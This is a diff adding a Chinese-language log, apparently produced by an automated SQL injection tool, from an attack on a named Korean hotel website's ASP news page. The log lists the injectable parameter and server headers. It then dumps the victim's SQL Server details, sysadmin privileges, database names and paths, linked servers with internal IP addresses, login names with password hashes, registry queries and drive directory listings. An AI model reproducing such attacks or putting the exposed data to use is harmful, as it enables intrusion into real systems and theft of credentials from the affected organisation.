@@ -1,0 +1,175 @@
+■漏洞信息:============================================================
+ ·URL:http://gyeongju.suites.co.kr/center/news/view.asp?idx=83
+ ·页面标题：
+ ·参数:idx=83
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:61.106.16.153
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Server: Microsoft-IIS/5.0
+Date: Mon, 04 Apr 2011 07:54:07 GMT
+X-Powered-By: ASP.NET
+Pragma: no_cache
+Cache-Control: no_cache
+Connection: Keep-Alive
+Content-Length: 11229
+Content-Type: text/html
+Expires: Mon, 04 Apr 2011 07:53:07 GMT
+Set-Cookie: ASPSESSIONIDQCSDRQBS=GIFAOBPBLMKIAOPMCEBMGNAJ; path=/
+Cache-Control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：kw_hotel
+- 用户名：dbo
+- 版本：Microsoft SQL Server  2000 - 8.00.194 (Intel X86) 
+	Aug  6 2000 00:57:48 
+	Copyright (c) 1988-2000 Microsoft Corporation
+	Standard Edition on Windows NT 5.0 (Build 2195: Service Pack 4)
+
+- 服务器名：FREESAMDB
+- 服务名：MSSQLSERVER
+- 系统用户名：sa
+
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+_KSL_DB	D:\Program Files\Microsoft SQL Server\MSSQL\data\_KSL_DB.mdf	
+Aesop_DB	d:\Program Files\Microsoft SQL Server\MSSQL\data\Aesop_DB_Data.MDF	
+dream_center	d:\Program Files\Microsoft SQL Server\MSSQL\data\dream_center_Data.MDF	
+eNomixSelf_JAVA	D:\DBdata\MSSQL\Data\eNomixSelf_JAVA.mdf	
+ERP_NET	d:\Program Files\Microsoft SQL Server\MSSQL\data\ERP_NET_Data.MDF	
+freesam	d:\Program Files\Microsoft SQL Server\MSSQL\Data\freesam_data.mdf	
+HoneyDoori_DB	d:\Program Files\Microsoft SQL Server\MSSQL\data\HoneyDoori_DB_Data.MDF	
+IBe_DB	d:\Program Files\Microsoft SQL Server\MSSQL\data\IBe_DB_Data.MDF	
+JEM_DB	d:\Program Files\Microsoft SQL Server\MSSQL\data\JEM_DB.mdf	
+Kumon_DB	C:\Program Files\Microsoft SQL Server\MSSQL\data\Kumon_DB_Data.MDF	
+KW_DB	d:\Program Files\Microsoft SQL Server\MSSQL\data\KW_DB_Data.MDF	
+kw_hotel	d:\Program Files\Microsoft SQL Server\MSSQL\data\kw_hotel_Data.MDF	
+kw_lnc_new	d:\Program Files\Microsoft SQL Server\MSSQL\data\kw_lnc_new_Data.MDF	
+KWI_DB	d:\Program Files\Microsoft SQL Server\MSSQL\data\KWI_DB_Data.MDF	
+kwi_db_back	d:\Program Files\Microsoft SQL Server\MSSQL\data\kwi_db_back_Data.MDF	
+kyowon_DB	d:\Program Files\Microsoft SQL Server\MSSQL\data\kyowon_DB_Data.MDF	
+Kyowon_sms	d:\Program Files\Microsoft SQL Server\MSSQL\Data\Kyowon_sms_data.mdf	
+kyowon_travel	d:\Program Files\Microsoft SQL Server\MSSQL\data\kyowon_travel.mdf	
+master	d:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+model	d:\Program Files\Microsoft SQL Server\MSSQL\data\model.mdf	
+msdb	d:\Program Files\Microsoft SQL Server\MSSQL\data\msdbdata.mdf	
+Northwind	d:\Program Files\Microsoft SQL Server\MSSQL\data\northwnd.mdf	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	FREESAMDB	1884	AWAITING COMMAND	SYSTEM	
+SQLAgent - Alert Engine	sleeping	FREESAMDB	1884	AWAITING COMMAND	SYSTEM	
+SQL 孽府 盒籍扁	sleeping	捞惑备-PC	3312	AWAITING COMMAND		
+MS SQLEM	sleeping	捞惑备-PC	3520	AWAITING COMMAND		
+Microsoft(R) Windows (R) 2000 Operating System	sleeping	KYOWONWEB03	1888	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+CONTDB	ORACLE	MSDAORA	CONTDB			
+FREESAM2004		SQLOLEDB	FREESAM2004			
+FREESAMDB	SQL Server	SQLOLEDB	FREESAMDB		FREESAMDB	
+JEMCLUB		SQLOLEDB	61.106.16.146			
+KYOWONI		SQLOLEDB	61.106.16.5			
+MASTER		SQLOLEDB	61.106.16.5			
+MASTER_DB		SQLOLEDB	61.106.16.5			
+MEMBER		SQLOLEDB	61.106.16.5			
+MINISAM		SQLOLEDB	61.106.16.157			
+MONEY		SQLOLEDB	61.106.16.161			
+PAYMENT		SQLOLEDB	61.106.16.161			
+PLUSJEM		SQLOLEDB	210.223.42.69			
+PURISEM		SQLOLEDB	61.106.16.123			
+SM	61.106.16.141	SQLOLEDB	61.106.16.141			
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+		0		01  7 2005  3:08AM	01  7 2005  3:08AM	
+BUILTIN\Administrators		1	茄惫绢	01  7 2005  3:08AM	01  7 2005  3:08AM	
+cubig	???醮?峷??????楍?腢?腅柷???	12	茄惫绢	06 11 2009  4:44PM	08  7 2009  2:26PM	
+erp	??劑????????嘹?回????冖斝??	19	茄惫绢	05 14 2010 11:31AM	05 14 2010 11:31AM	
+freesam	???每?浩煳乳?????栽?????	7	茄惫绢	06  1 2005  4:02PM	06 28 2005  1:34PM	
+freesam	???每?浩煳乳?????栽?????	7	茄惫绢	06  1 2005  4:02PM	06 28 2005  1:34PM	
+intro	?????祩??懌???璽???硄????	1	茄惫绢	09 23 2008  3:41PM	03  1 2009  5:43PM	
+kyowon	曊??眜隆帶????	0		06 11 2009  4:35PM	06 11 2009  4:35PM	
+nutility	????????厭樥??繿???⑻???揘	17	茄惫绢	06 15 2009  4:07PM	06 15 2009  4:07PM	
+purisem_db	??巹?绠??	0		11 18 2005  7:48PM	11 18 2005  7:48PM	
+sa	???捺??译?????矝?皏?濹????	7	茄惫绢	08  6 2000  1:27AM	06 15 2009  3:46PM	
+sa	????杺?巃	0		01  7 2005  3:36AM	01  7 2005  3:36AM	
+sa	???????墮??□	0		01 20 2009  9:13AM	01 20 2009  9:13AM	
+sa	???????墮??□	0		01 20 2009  9:13AM	01 20 2009  9:13AM	
+sa	????杺?巃	0		01  7 2005  1:24PM	01  7 2005  1:24PM	
+sa	???????墮??□	0		01 20 2009  9:13AM	01 20 2009  9:13AM	
+sa	???????墮??□	0		01 20 2009  9:13AM	01 20 2009  9:13AM	
+sa	????杺??	0		08 22 2007  5:51PM	08 22 2007  5:51PM	
+sa	????杺??	0		03 18 2008  3:13PM	03 18 2008  3:13PM	
+sa	????杺?巃	0		06 11 2009  4:33PM	06 11 2009  4:33PM	
+sa	????杺?巃	0		06 11 2009  4:33PM	06 11 2009  4:33PM	
+sms	??????扗???????????玶	8	茄惫绢	01  7 2005  3:25AM	05 30 2007  1:38PM	
+tempuser	??モ???┋????????熏?旴??荇?	7	茄惫绢	11 10 2006  4:13PM	11 10 2006  4:22PM	
+travel_ekp	瘌靥???厽ｆ???楗??????稁????	9	茄惫绢	06 11 2009  9:38AM	06 11 2009  9:39AM	
+zenius	????胨??????斂??脣???決噾?	1	茄惫绢	01  7 2005  3:16PM	01  7 2005  3:20PM	
+
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+取记录数失败，使用设定值：5
+Dir of D:: 
+
+背盔橇肺弊伐葛澜\
+Data\
+DB_BACKUP\
+DBdata\
+Ftp_Root\
+oracle\
+os_backup\
+PerfLogs\
+PGM\
+Program Files\
+RECYCLER\
+SET\
+sms_kyowon\
+sql2ksp3\
+suites_ftp_tran\
+System Volume Information\
+Whistl\
+WUTemp\
+default.asp
+default_tmp.asp
+kwi_db.bak
+Profiler_Baseline_FREESAMDB_20070613_155753.trc
+tr1.trc
+web.vbs
+
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+取记录数失败，使用设定值：5
+Dir of D:\sms_kyowon: 
+一次性获取失败，正在批次获取……
+Dir of D:\Whistl: 
+一次性获取失败，正在批次获取……
+Dir of D:\suites_ftp_tran: 
+一次性获取失败，正在批次获取……
